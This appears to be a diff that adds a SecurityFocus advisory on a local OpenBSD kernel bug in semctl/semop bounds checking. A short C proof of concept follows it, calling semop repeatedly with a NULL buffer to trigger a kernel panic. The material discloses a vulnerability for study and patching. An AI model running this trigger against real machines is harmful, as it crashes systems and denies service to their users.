@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/9086/info
+
+A local OpenBSD kernel vulnerability has been discovered when handling the semctl and semop system calls. The problem specifically occurs due to improper sanity checking before handling a user-supplied semaphore set. It is said that this could lead to the corruption of kernel-based memory and may result in a kernel panic.
+
+The problem occurs due to the affected code verifying the bounds of an integer against an incorrect variable. This could result in an unintended index into an array situated in heap memory. The value taken from the location within the array is interpreted as a pointer and later dereferenced. If a value believed to be a legitimate memory address were used, this would effectively result in a segmentation violation within the kernel, causing it to panic.
+
+Although unconfirmed, due to the nature of this issue it has been speculated that this issue could be exploited to gain elevated system privileges. 
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/sem.h>
+#include <sys/ipc.h>
+
+int
+main()
+{
+    int i;
+
+        for(i = 0; i < 0x40; i++)
+                semop(i, (struct sembuf *) NULL, 0);
+
+}
+
